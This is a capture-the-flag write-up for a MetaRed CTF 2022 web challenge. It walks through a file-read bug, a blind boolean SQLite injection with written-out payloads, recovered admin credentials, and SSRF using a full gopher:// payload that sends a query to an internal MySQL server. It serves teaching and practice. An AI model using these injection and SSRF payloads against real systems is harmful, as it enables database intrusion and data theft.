# Writeup-Go-Tigers-
### MetaRed CTF Argentina 2022

## Go tigers!
 <img src=img/19.png class="center">

When visiting the website, we were face to two inut fields. The first one require an id and fetch in the database.If the id is valid it displays the id and the username.if not it displays nothing.The second field was an input that displays the content of a file using the function file_gets_content().

IMG

We tried to trigger an error using a quote and fortuantely we got an error from the database.The error reveals that a function called supersafeWaf() was filtering our input.
IMG 

(I discovered later that this was useless since my team managed to read the admin password from ../tiger.db using the second input , but hey i enjoyed tortuaring myself to manually perform a blind boolean based sql injection and that was fun!)
IMG 

Using the second input, we tried using it to get the source code of the "index.php" to understand the behaviour of the web application. 
Looking at the code of "index.php", we find out that ther uspersafeWaf() function actually filters some statements like 'select' , 'order' .. 
IMG

We tried out some SQLi payloads to see that this was a blind boolean based sql injection , it's an sqlite3 database.
Our payload was **1 AND CASE WHEN substr(user,1,1)='a' THEN 1 ELSE load_extension(1) END**
IMG

Since the username having an id 1 was 'admin' we didn't get an error and the data corresponding was displayed. 
Our final payload was **1 AND CASE WHEN substr(pass,1,1)='a' THEN 1 ELSE load_extension(1) END**
IMG

--> username : admin 
--> password : This_password_is_very_safe!

I discovered that there is an admin page (admin.php) that require a username and a password.So paasing those creds to the form we got to the page :
IMG
This time one input that gets an url was present and after reading the source code of the admin.php (using the second input field in the index.php) we decided to look for an SSRF: 

IMG

**What is SSRF?**
Server-Side Request Forgery (SSRF) refers to an attack wherein an attacker is able to send a crafted request from a vulnerable web application. SSRF is usually used to target internal systems behind firewalls that are normally inaccessible to an attacker from the external network.

All protocols other than file:// was valid since a delay of 5s took place. Reading the source code of the 'admin.php' once again a comment cought our attention **Acordarse de Fixear el BD user juanperez** which means 'Remember to Fix the BD user juanperez'
ehhhmmm ... So maybe there is another database running on internal!
our hypothese was confirmed when we saw the line of code **{ exec('timeout 2 nc -z mysqlsafedb.com 3306 ; if [ $? -eq 0 ] ; then echo "Online"; else echo "Offline"; fi', $out); echo "<pre>"; print_r($out);**. That means that the othe button was checking the whole time if this database is online or not. To communicate with this databse we decided to use the protocol **Gopher**.

**What is Gopher?**
Gopher is an application-layer protocol that provides the ability to extract and view Web documents stored on remote Web servers. Gopher was conceived in 1991 as one of the Internet’s first data/file access protocols to run on top of a TCP/IP network. It was developed at the University of Minnesota and is named after the school’s mascot.
We can use gopher:// to communicate with the MySQL database.

Basic agreement format: URL:gopher ://<host>:<port>/<gopher-path>_ Followed by TCP data flow

IMG

Tring the payload : **gopher://mysqlsafedb.com:3306/_%**
using gopherus, we were able to generate the following sql query : SELECT schema_name FROM information_schema.schemata
Our final payload was : **gopher://mysqlsafedb.com:3306/_%a8%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%6a%75%61%6e%70%65%72%65%7a%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%34%00%00%00%03%73%65%6c%65%63%74%20%73%63%68%65%6d%61%5f%6e%61%6d%65%20%66%72%6f%6d%20%69%6e%66%6f%72%6d%61%74%69%6f%6e%5f%73%63%68%65%6d%61%2e%73%63%68%65%6d%61%74%61%01%00%00%00%01**
And the flag was the name of a database other than 'information_schema.schemata'

IMG




 ## Some Ressources:

 - https://programming.vip/docs/ssrf-uses-gopher-to-attack-mysql-and-intranet.html
 - https://github.com/tarunkant/Gopherus



